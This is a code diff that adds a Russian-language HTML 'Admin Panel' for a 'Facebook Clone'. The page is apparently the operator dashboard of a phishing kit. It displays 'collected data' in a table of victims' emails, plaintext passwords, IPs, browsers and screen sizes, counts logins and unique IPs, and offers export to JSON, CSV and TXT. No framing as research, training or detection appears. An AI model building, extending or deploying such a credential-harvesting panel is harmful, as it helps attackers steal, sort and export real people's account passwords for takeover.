@@ -1,4 +1,364 @@
-<script>
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Facebook Clone</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- ПОДКЛЮЧАЕМ CONFIG ПЕРВЫМ! -->
+    <script src="config.js"></script>
+    <style>
+        /* Админ стили */
+        .admin-header {
+            background: #242526;
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .stat-card h3 {
+            margin: 0 0 10px 0;
+            color: #65676b;
+            font-size: 14px;
+        }
+        
+        .stat-card .value {
+            font-size: 32px;
+            font-weight: bold;
+            color: #1877f2;
+        }
+        
+        .filters {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .filter-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 10px;
+        }
+        
+        .filter-input {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        .table-container {
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 30px;
+        }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .data-table th {
+            background: #f0f2f5;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+            color: #65676b;
+        }
+        
+        .data-table td {
+            padding: 12px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .data-table tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+        
+        .btn-primary {
+            background: #1877f2;
+            color: white;
+        }
+        
+        .btn-success {
+            background: #42b72a;
+            color: white;
+        }
+        
+        .btn-danger {
+            background: #ff4444;
+            color: white;
+        }
+        
+        .btn-warning {
+            background: #ffbb33;
+            color: white;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            min-width: 400px;
+            max-width: 90%;
+        }
+        
+        .loader {
+            text-align: center;
+            padding: 20px;
+            display: none;
+        }
+        
+        .admin-footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #65676b;
+            font-size: 12px;
+        }
+        
+        /* Кнопки показа/скрытия пароля в таблице */
+        .password-cell {
+            cursor: pointer;
+            position: relative;
+        }
+        
+        .password-cell:hover:after {
+            content: attr(title);
+            position: absolute;
+            background: #242526;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 4px;
+            z-index: 100;
+            top: -30px;
+            left: 0;
+            font-size: 12px;
+            white-space: nowrap;
+        }
+        
+        .email-cell {
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+        }
+        
+        .time-cell {
+            white-space: nowrap;
+        }
+        
+        #adminInterface {
+            display: none;
+            padding: 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        #passwordModal {
+            display: flex;
+        }
+    </style>
+</head>
+<body>
+    <!-- Модальное окно для пароля -->
+    <div id="passwordModal" class="modal">
+        <div class="modal-content">
+            <h2 style="margin-top: 0;">🔐 Административная панель</h2>
+            <p>Введите пароль для доступа к админ панели:</p>
+            <input type="password" id="adminPassword" class="filter-input" placeholder="Пароль" style="width: 100%; margin-bottom: 15px;">
+            <div class="action-buttons">
+                <button onclick="checkPassword()" class="btn btn-primary" style="flex: 1;">Войти</button>
+                <button onclick="autoLogin()" class="btn btn-success">Автовход</button>
+                <button onclick="goToPreview()" class="btn">Предпросмотр</button>
+            </div>
+            <p style="margin-top: 15px; font-size: 12px; color: #65676b;">
+                Подсказка: пароль указан в config.js<br>
+                Для автовхода: Ctrl+Shift+Enter
+            </p>
+        </div>
+    </div>
+    
+    <!-- Модальное окно экспорта -->
+    <div id="exportModal" class="modal">
+        <div class="modal-content">
+            <h2 style="margin-top: 0;">📤 Экспорт данных</h2>
+            <p>Выберите формат экспорта:</p>
+            <div class="action-buttons" style="margin-bottom: 20px;">
+                <button onclick="exportData('json')" class="btn btn-primary">JSON</button>
+                <button onclick="exportData('csv')" class="btn btn-success">CSV</button>
+                <button onclick="exportData('txt')" class="btn">TXT</button>
+            </div>
+            <div>
+                <h4>Предпросмотр данных:</h4>
+                <pre id="dataPreview" style="background: #f5f5f5; padding: 15px; border-radius: 6px; max-height: 200px; overflow: auto; font-size: 12px;"></pre>
+            </div>
+            <div class="action-buttons" style="margin-top: 20px;">
+                <button onclick="closeExportModal()" class="btn" style="flex: 1;">Закрыть</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Основной интерфейс админки -->
+    <div id="adminInterface">
+        <!-- Шапка -->
+        <div class="admin-header">
+            <h1 style="margin: 0; display: flex; align-items: center; gap: 10px;">
+                🛡️ Панель управления Facebook Clone
+                <span style="font-size: 14px; background: #1877f2; padding: 3px 8px; border-radius: 12px; color: white;">
+                    v3.0.0 FIXED
+                </span>
+            </h1>
+            <p style="margin: 10px 0 0 0; opacity: 0.8;">Мониторинг и управление собранными данными</p>
+        </div>
+        
+        <!-- Статистика -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>👥 Всего пользователей</h3>
+                <div class="value" id="totalUsers">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>📈 Входов сегодня</h3>
+                <div class="value" id="todayLogins">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>🌐 Уникальных IP</h3>
+                <div class="value" id="uniqueIPs">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>⏰ Последний вход</h3>
+                <div class="value" id="lastLogin">Нет данных</div>
+            </div>
+        </div>
+        
+        <!-- Фильтры -->
+        <div class="filters">
+            <h3 style="margin-top: 0;">🔍 Фильтры поиска</h3>
+            <div class="filter-row">
+                <input type="text" id="filterEmail" class="filter-input" placeholder="Фильтр по email" oninput="filterData()">
+                <input type="text" id="filterIP" class="filter-input" placeholder="Фильтр по IP" oninput="filterData()">
+                <input type="date" id="filterDate" class="filter-input" onchange="filterData()">
+                <select id="filterLimit" class="filter-input" onchange="filterData()">
+                    <option value="25">Последние 25</option>
+                    <option value="50">Последние 50</option>
+                    <option value="100">Последние 100</option>
+                    <option value="0">Все записи</option>
+                </select>
+            </div>
+            <div class="action-buttons">
+                <button onclick="refreshData()" class="btn btn-primary">🔄 Обновить (F5)</button>
+                <button onclick="clearAllData()" class="btn btn-danger">🗑️ Очистить всё (Ctrl+D)</button>
+                <button onclick="showExportModal()" class="btn btn-success">📤 Экспорт (Ctrl+E)</button>
+                <button onclick="showDataPreview()" class="btn">👁️ Предпросмотр (Ctrl+P)</button>
+                <button onclick="logoutAdmin()" class="btn btn-warning">🚪 Выход (Ctrl+Q)</button>
+            </div>
+            <p style="margin: 15px 0 0 0; font-size: 12px; color: #65676b;" id="dataCount">
+                Загрузка данных...
+            </p>
+        </div>
+        
+        <!-- Лоадер -->
+        <div id="loader" class="loader">
+            <div class="spinner"></div>
+            <p>Загрузка данных...</p>
+        </div>
+        
+        <!-- Таблица данных -->
+        <div class="table-container">
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>#</th>
+                        <th>Email</th>
+                        <th>Пароль</th>
+                        <th>IP</th>
+                        <th>Время</th>
+                        <th>Браузер</th>
+                        <th>Экран</th>
+                        <th>Действия</th>
+                    </tr>
+                </thead>
+                <tbody id="tableBody">
+                    <tr>
+                        <td colspan="8" style="text-align: center; padding: 50px; color: #65676b;">
+                            Загрузка данных...
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        
+        <!-- Аналитика -->
+        <div style="background: white; padding: 20px; border-radius: 8px; margin-bottom: 30px;">
+            <h3 style="margin-top: 0;">📊 Аналитика</h3>
+            <div id="analytics">
+                <p style="color: #65676b;">Данные аналитики загружаются...</p>
+            </div>
+        </div>
+        
+        <!-- Футер -->
+        <div class="admin-footer">
+            <p>Facebook Clone Admin Panel v3.0.0 | Данные хранятся в LocalStorage</p>
+            <p>Используйте Ctrl+Shift+A на главной странице для быстрого доступа</p>
+            <p style="margin-top: 10px;">
+                <button onclick="goToPreview()" class="btn" style="padding: 5px 15px; font-size: 12px;">
+                    🔄 Перейти к предпросмотру
+                </button>
+            </p>
+        </div>
+    </div>
+    
+    <!-- Подключаем скрипты -->
+    <script src="data.js"></script>
+    
+    <!-- СКРИПТ АДМИНКИ -->
+    <script>
         // Проверка пароля при загрузке
         document.addEventListener('DOMContentLoaded', function() {
             console.log('Admin page loaded');
@@ -606,3 +966,5 @@ IP: ${user.ipInfo?.ip || 'unknown'}
             }
         });
     </script>
+</body>
+</html>
